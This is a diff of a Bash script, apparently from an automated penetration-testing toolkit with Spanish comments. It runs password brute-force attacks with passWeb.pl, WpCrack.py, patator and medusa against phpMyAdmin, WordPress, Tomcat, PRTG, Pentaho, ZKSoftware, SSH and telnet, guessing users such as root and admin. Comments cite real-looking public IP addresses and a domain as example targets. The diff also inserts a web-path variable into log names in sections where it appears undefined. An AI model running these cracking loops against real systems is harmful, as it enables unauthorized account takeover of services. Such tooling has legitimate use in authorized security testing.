@@ -168,6 +168,127 @@ find  servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
 echo "Revisar servicios "
 
 
+
+if [ -f servicios/admin-web-fingerprint-inserted.txt ]
+then	  		  
+	echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"			
+	while IFS= read -r line 
+	do
+		ip_port_path=`echo $line | cut -d ";" -f 1` #https://200.58.87.208:443/wp-login.php
+		fingerprint=`echo $line | cut -d ";" -f 2`
+		echo -e "\n\t########### "$ip_port_path #######"	
+			
+		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
+		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
+		if [[ ${host_port} == *":"* ]]; then
+			port=`echo $host_port | cut -d ":" -f 2`	
+		else
+			if [[  ${proto_http} == *"https"* ]]; then
+				port="443"
+			else
+				port="80"
+			fi
+		fi
+		host=`echo $host_port | cut -d ":" -f 1`				
+		path_web=`echo $ip_port_path | cut -d "/" -f 4-5`	
+		path_web=`echo "/"$path_web`
+		path_web_sin_slash=$(echo "$path_web" | tr -d '/')
+
+		if [ $VERBOSE == 's' ]; then  echo -e "[+] host = $host port=$port path_web = $path_web " ; fi
+		if [ $VERBOSE == 's' ]; then  echo -e "fingerprint $fingerprint" ; fi
+		
+		if [[ $fingerprint = *"phpmyadmin"* ]]; then
+			echo -e "\t[+] phpMyAdmin identificado"
+			echo "passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d \"$path_web\" -u root|admin -f passwords.txt" > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt 
+			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u root -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
+			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u admin -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
+			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u mysql -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
+			sleep 60
+			for user_ssh in $(cat logs/enumeracion/"$ip"_users.txt 2>/dev/null); do
+				echo "Probando usuario: $user_ssh en $ip"
+				passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u $user_ssh -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
+				sleep 60
+			done
+
+			if [[ "$MODE" == "total" ]] ; then					
+				#######  wordpress user ######
+				grep -qi wordpress ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"
+				greprc=$?
+				if [[ $greprc -eq 0 ]];then 
+					passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u wordpress -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
+				fi
+
+				#######  joomla user ######
+				grep -qi joomla ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"
+				greprc=$?
+				if [[ $greprc -eq 0 ]];then 
+					passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u joomla -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt &
+				fi
+
+				#######  drupal user ######			
+				grep -qi drupal ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt"
+				greprc=$?
+				if [[ $greprc -eq 0 ]];then 
+					passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u drupal -f passwords-web.txt >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt&
+				fi	
+			fi												
+		
+		fi	
+			
+		
+		if [[ $fingerprint = *"joomla"* ]]; then
+			echo -e "\t[+] Joomla identificado"
+			#echo -e "\t[+] Probando contraseñas comunes ...."
+			#cewl -w cewl-passwords.txt -e -a $proto_ip_port
+			#cat passwords.txt cewl-passwords.txt | sort | uniq > passwords.txt
+			#echo "admin" > username.txt
+			#echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USERNAME admin;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt
+			#msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USERNAME admin;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordCMS.txt 2>/dev/null &			
+			#rm username.txt
+					
+		fi	
+
+		#echo "fingerprint $fingerprint"	
+		echo "line $fingerprint"	
+		#if [[ $fingerprint = *'/manager/html'* ]]; then
+		if [[ $fingerprint = *'tomcat admin'* ]]; then
+			echo -e "\t[+] Tomcat identificado ($ip_port_path)"									
+			echo -e "\t\t[+] Testing common passwords"	
+			#echo "patator.py http_fuzz url="$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
+			patator.py http_fuzz --rate-limit=1 --threads=1 url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordDefecto.txt 2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt &
+		fi	
+
+
+		if [[ $fingerprint = *"wordpress"* ]]; then			
+			ip_port_path=`echo $ip_port_path |sed 's/wp-login.php//g'`
+			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip_port_path $RESET"
+
+			grep -i ",$host" $FILE_SUBDOMAINS 2>/dev/null | grep -qi InMotion
+    		greprc=$?
+    		if [[ $greprc -eq 0 ]];then 
+				echo -e "$OKRED \t[+] Hosting InMotion detectado $RESET"
+			else
+				echo -e "\t[+] Probando contraseñas comunes ...."
+
+				
+				if [ -f ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt" ]; then
+					#https://181.115.188.36:443/				
+					for user in $(cat .vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt); do
+						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
+						echo "WpCrack.py -t $ip_port_path -u $user -p passwords-web.txt --thread 1" >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt
+						WpCrack.py -t $ip_port_path -u $user -p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt &
+					done
+				else
+					echo -e "\t\t[+] Probando con usuario por defecto admin"	
+					echo "WpCrack.py -t $ip_port_path -u admin -p passwords-web.txt" >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null
+					WpCrack.py -t $ip_port_path -u admin -p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null
+				fi						
+			fi			
+		fi	
+	done < servicios/admin-web-fingerprint-inserted.txt			
+fi
+
+
 if [ -f servicios/mssql.txt ]
 then
 	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
@@ -386,171 +507,43 @@ then
 
 		if [[ ! -z $ENTIDAD ]];then
 			echo -e "\t[+]Probando usuario: $ENTIDAD" 
-			medusa -t 1 -f -u $ENTIDAD -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
+			medusa -t 1 -f -u $ENTIDAD -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt &			
 		fi
 
 		for user_ssh in $(cat logs/enumeracion/"$ip"_users.txt 2>/dev/null); do
 			echo -e "\t[+]Probando usuario: $user_ssh en $ip"
-			medusa -t 1 -f -u $user_ssh -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+			medusa -t 1 -f -u $user_ssh -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt &
 		done
 				
 		echo -e "\t[+]Probando usuario: root"								
-		medusa -t 1 -f -u root -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+		medusa -t 1 -f -u root -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt &
 	done	
 fi
 
 
-old_ifs="$IFS"
-IFS=$'\n'  # make newlines the only separator     
-
-if [ -f servicios/admin-web-fingerprint-inserted.txt ]
-then	  		  
-	echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"			
-	for line in $(cat servicios/admin-web-fingerprint-inserted.txt); do	
-		IFS=$old_ifs
-		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo/wp-login.php https://www.sanmateo.com.bo:8443/wp-login.php		
-		fingerprint=`echo $line | cut -d ";" -f 2`
-		echo -e "\n\t########### "$ip_port_path #######"	
-			
-		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
-		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
-		if [[ ${host_port} == *":"* ]]; then
-			port=`echo $host_port | cut -d ":" -f 2`	
-		else
-			if [[  ${proto_http} == *"https"* ]]; then
-				port="443"
-			else
-				port="80"
-			fi
-		fi
-		host=`echo $host_port | cut -d ":" -f 1`				
-		path_web=`echo $ip_port_path | cut -d "/" -f 4-5`	
-		path_web=`echo "/"$path_web`
-
-		if [ $VERBOSE == 's' ]; then  echo -e "[+] host = $host port=$port path_web = $path_web " ; fi
-		if [ $VERBOSE == 's' ]; then  echo -e "fingerprint $fingerprint" ; fi
-		
-		if [[ $fingerprint = *"phpmyadmin"* ]]; then
-			echo -e "\t[+] phpMyAdmin identificado"
-			echo "passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d \"$path_web\" -u root|admin -f passwords.txt" > logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt 
-			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u root -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
-			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u admin -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
-			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u mysql -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
-			sleep 60
-			for user_ssh in $(cat logs/enumeracion/"$ip"_users.txt 2>/dev/null); do
-				echo "Probando usuario: $user_ssh en $ip"
-				passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u $user_ssh -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
-				sleep 60
-			done
-
-			if [[ "$MODE" == "total" ]] ; then					
-				#######  wordpress user ######
-				grep -qi wordpress .enumeracion2/"$host"_"$port"_webData.txt
-				greprc=$?
-				if [[ $greprc -eq 0 ]];then 
-					passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u wordpress -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
-				fi
-
-				#######  joomla user ######
-				grep -qi joomla .enumeracion2/"$host"_"$port"_webData.txt
-				greprc=$?
-				if [[ $greprc -eq 0 ]];then 
-					passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u joomla -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
-				fi
-
-				#######  drupal user ######			
-				grep -qi drupal .enumeracion2/"$host"_"$port"_webData.txt
-				greprc=$?
-				if [[ $greprc -eq 0 ]];then 
-					passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u drupal -f passwords-web.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt&
-				fi	
-			fi												
-		
-		fi	
-			
-		
-		if [[ $fingerprint = *"joomla"* ]]; then
-			echo -e "\t[+] Joomla identificado"
-			#echo -e "\t[+] Probando contraseñas comunes ...."
-			#cewl -w cewl-passwords.txt -e -a $proto_ip_port
-			#cat passwords.txt cewl-passwords.txt | sort | uniq > passwords.txt
-			#echo "admin" > username.txt
-			#echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USERNAME admin;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$host"_"$port"_passwordCMS.txt
-			#msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USERNAME admin;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$host"_"$port"_passwordCMS.txt 2>/dev/null &			
-			#rm username.txt
-					
-		fi	
-
-		#echo "fingerprint $fingerprint"	
-		echo "line $fingerprint"	
-		#if [[ $fingerprint = *'/manager/html'* ]]; then
-		if [[ $fingerprint = *'tomcat admin'* ]]; then
-			echo -e "\t[+] Tomcat identificado ($ip_port_path)"									
-			echo -e "\t\t[+] Testing common passwords"	
-			#echo "patator.py http_fuzz url="$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
-			patator.py http_fuzz --rate-limit=1 --threads=1 url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo >> logs/cracking/"$host"_"$port"_passwordDefecto.txt 2>> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt &
-		fi	
-
-
-		if [[ $fingerprint = *"wordpress"* ]]; then			
-			ip_port_path=`echo $ip_port_path |sed 's/wp-login.php//g'`
-			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip_port_path $RESET"
-
-			grep -i ",$host" $FILE_SUBDOMAINS 2>/dev/null | grep -qi InMotion
-    		greprc=$?
-    		if [[ $greprc -eq 0 ]];then 
-				echo -e "$OKRED \t[+] Hosting InMotion detectado $RESET"
-			else
-				echo -e "\t[+] Probando contraseñas comunes ...."
-				if [ -f ".vulnerabilidades2/"$host"_"$port"_wpUsers.txt" ]; then
-					#https://181.115.188.36:443/				
-					for user in $(cat .vulnerabilidades2/"$host"_"$port"_wpUsers.txt); do
-						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
-						echo "WpCrack.py -t $ip_port_path -u $user --p passwords-web.txt" >> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt
-						WpCrack.py -t $ip_port_path -u $user --p passwords-web.txt >> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt
-						egrep -iaq "Credencials" logs/cracking/"$host"_*_passwordCMS.txt 2>/dev/null
-						greprc=$?
-						if [[ $greprc -eq 0 ]] ; then	
-							echo -e "\t\t[+] Credenciales encontradas"						
-							break
-						fi
-					done
-				else
-					echo -e "\t\t[+] Probando con usuario por defecto admin"	
-					echo "WpCrack.py -t $ip_port_path -u admin --p passwords-web.txt" >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null
-					WpCrack.py -t $ip_port_path -u admin --p passwords-web.txt >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null
-				fi						
-				grep --color=never -ia 'Credenciales' logs/cracking/"$host"_*_passwordCMS.txt 2>/dev/null  > logs/vulnerabilidades/"$host"_"$port"_passwordCMS.txt
-				grep -i credenciales logs/vulnerabilidades/"$host"_"$port"_passwordCMS.txt > .vulnerabilidades/"$host"_"$port"_passwordCMS.txt  2>/dev/null 
-			fi			
-		fi	
-		
-	done			
-	insert_data
-fi
 
 
 
-	#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port"_passTomcat2.txt 2>> logs/cracking/"$host"_"$port"_passTomcat2.txt
+	#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat2.txt 2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat2.txt
 	#si encontro el password
-#				egrep -iq "200 OK" logs/cracking/"$host"_"$port"_passTomcat2.txt
+#				egrep -iq "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat2.txt
 	#greprc=$?
 	#if [[ $greprc -eq 0 ]] ; then			
 		#echo -e "\t[i] Password encontrado"
 		## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-		#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
-		#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$host"_"$port"_passTomcat.txt								
+		#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
+		#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt								
 	#fi
 	
-	#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port"_passTomcat3.txt 2>> logs/cracking/"$host"_"$port"_passTomcat3.txt
+	#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat3.txt 2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat3.txt
 	#si encontro el password
-	#egrep -iq "200 OK" logs/cracking/"$host"_"$port"_passTomcat3.txt
+	#egrep -iq "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat3.txt
 	#greprc=$?
 	#if [[ $greprc -eq 0 ]] ; then			
 		#echo -e "\t[i] Password encontrado"
 		## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-		#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
-		#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$host"_"$port"_passTomcat.txt								
+		#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
+		#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passTomcat.txt								
 	#fi		
 
 
@@ -589,7 +582,7 @@ fi
 # 		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 2>/dev/null
 # 		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_oracle_passwordBD.txt
 
-# 		SIDS=`grep '|' logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | grep -v oracle-sid-brute | awk '{print $2}'`
+# 		SIDS=`grep '|' logs/vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_oracleSids.txt | grep -v oracle-sid-brute | awk '{print $2}'`
 		
 # 		for SID in $SIDS; do
 # 			echo -e "[+] Probando SID $SID"
@@ -720,8 +713,8 @@ if [[ "$MODE" == "total" ]] ; then
 		for line in $(cat servicios/telnet.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
-			medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
-			medusa -t 1 -f -e ns -u root -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+			medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt &
+			medusa -t 1 -f -e ns -u root -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt &
 		done	
 	fi
 
@@ -736,9 +729,9 @@ if [[ "$MODE" == "total" ]] ; then
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`								
 			echo -e "[+] Probando $ip:$port"
-			echo "passWeb.pl -s https -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
-			passWeb.pl -s https -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
-			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+			echo "passWeb.pl -s https -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt" > logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
+			passWeb.pl -s https -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt>> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
+			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 			echo ""			
 		done
 		insert_data
@@ -756,9 +749,9 @@ if [[ "$MODE" == "total" ]] ; then
 			port=`echo $line | cut -f2 -d":"`
 						
 			echo -e "[+] Probando $ip"
-			passWeb.pl -s https -t $ip -p $port -d / -m pentaho -u admin -f passwords.txt > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
+			passWeb.pl -s https -t $ip -p $port -d / -m pentaho -u admin -f passwords.txt > logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 			sleep 2
-			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt | tee -a .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 			
 			echo ""			
 		done
@@ -778,19 +771,19 @@ if [[ "$MODE" == "total" ]] ; then
 				port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
 				
 				#probar con usuario admin
-				patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
-				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
+				patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt
+				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
-					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 				fi	
 				
 				#probar con usuario root
-				patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
-				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
+				patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt			
+				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
-					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 				fi
 							
 			else
@@ -799,19 +792,19 @@ if [[ "$MODE" == "total" ]] ; then
 				port=`echo $line | cut -f2 -d":"`
 				if [[ ${port} == *"443"*  ]];then 	
 					#probar con usuario admin
-					patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
-					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
+					patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt
+					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt`
 					greprc=$?
 					if [[ $greprc -eq 0 ]] ; then
-						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 					fi	
 				
 					#probar con usuario root
-					patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
-					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
+					patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt			
+					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt`
 					greprc=$?
 					if [[ $greprc -eq 0 ]] ; then
-						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
+						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinadoServ.txt
 					fi
 				fi
 			fi
@@ -829,9 +822,9 @@ if [[ "$MODE" == "total" ]] ; then
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`				
 			echo -e "[+] Probando $ip"		
-			echo -e "passWeb.pl -s http -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt" > logs/cracking/"$ip"_"$port"_passwordZKSoftware.txt
-			passWeb.pl -s http -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordZKSoftware.txt
-			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordZKSoftware.txt
+			echo -e "passWeb.pl -s http -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt" > logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt
